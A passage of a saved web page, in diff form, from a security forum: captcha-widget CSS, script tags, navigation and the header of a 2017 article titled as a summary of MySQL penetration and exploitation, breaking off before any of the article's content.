+@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style>
+    <script src="./Mysql数据库渗透及漏洞利用总结_files/editormd.min.js"></script>
+
+<link type="text/css" rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/codemirror.min.css"><link type="text/css" rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/dialog.css"><link type="text/css" rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/matchesonscrollbar.css"><script id="-forum-static-editor-md-lib-codemirror-codemirror-min" type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/codemirror.min.js"></script><style id="style-1-cropbar-clipper">/* Copyright 2014 Evernote Corporation. All rights reserved. */
+.en-markup-crop-options {
+    top: 18px !important;
+    left: 50% !important;
+    margin-left: -100px !important;
+    width: 200px !important;
+    border: 2px rgba(255,255,255,.38) solid !important;
+    border-radius: 4px !important;
+}
+
+.en-markup-crop-options div div:first-of-type {
+    margin-left: 0px !important;
+}
+</style><script id="-forum-static-editor-md-lib-codemirror-modes-min" type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/modes.min.js"></script><script id="-forum-static-editor-md-lib-codemirror-addons-min" type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/addons.min.js"></script><script id="-forum-static-editor-md-lib-marked-min" type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/marked.min.js"></script><script id="-forum-static-editor-md-lib-prettify-min" type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/prettify.min.js"></script><link type="text/css" rel="stylesheet" href="file:///forum/static/editor.md/lib/codemirror/codemirror.min.css"><link type="text/css" rel="stylesheet" href="file:///forum/static/editor.md/lib/codemirror/addon/dialog/dialog.css"><link type="text/css" rel="stylesheet" href="file:///forum/static/editor.md/lib/codemirror/addon/search/matchesonscrollbar.css"><script id="-forum-static-editor-md-lib-codemirror-codemirror-min" type="text/javascript" src="file:///forum/static/editor.md/lib/codemirror/codemirror.min.js"></script></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+          <!--  <a class="brand"
+               href="/forum/">
+            </a> -->
+           <a class="brand" href="https://xianzhi.aliyun.com/forum/">
+  <object data="./Mysql数据库渗透及漏洞利用总结_files/xianzhi_icon.svg" type="image/svg+xml"></object></a>
+            <div class="nav-collapse collapse">
+                <ul class="nav pull-right">
+                    <li>
+                        <form method="get" action="https://xianzhi.aliyun.com/forum/" style="line-height: 20px;margin: 3px 0 0 5px">
+                            
+                                <input type="text" name="keyword" placeholder="搜索相关主题..." style="margin-top:12px">
+                            
+                            <button type="submit" class="btn" style="margin: 0 0 0 5px">搜一搜</button>
+                        </form>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    <div class="row box">
+        <ol class="breadcrumb">
+            <li><a href="https://xianzhi.aliyun.com/forum/tab/1/">技术研究</a></li>
+            <li> /</li>
+            <li><a href="https://xianzhi.aliyun.com/forum/node/1/">漏洞研究</a></li>
+        </ol>
+        
+        <div class="box-container">
+            <div class="clearfix user-info topic-list">
+                
+                    <img class="avatar pull-left" src="./Mysql数据库渗透及漏洞利用总结_files/default_avatar.png">
+                
+                <p>
+                    
+                    
+                    <span class="topic-title">Mysql数据库渗透及漏洞利用总结</span>
+                </p>
+                <p class="topic-info">
+                    <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/3207/">simeon</a>
+                    <span>发表于:2017-11-04 10:40:00</span>
+                </p>
+                <div class="clearfix topic-title">
+                    
+                    
+                </div>
+            </div>
+
+            <div class="topic-content markdown-body">
+                
+                    <!-- content_hidden 是判断过是否设置内容回复可见和当前访问者是否回复过帖子的一个标志，True为对该用户隐藏   -->
+                    <p></p><h1>Mysql数据库渗透及漏洞利用总结</h1>
+<p>Simeon</p>
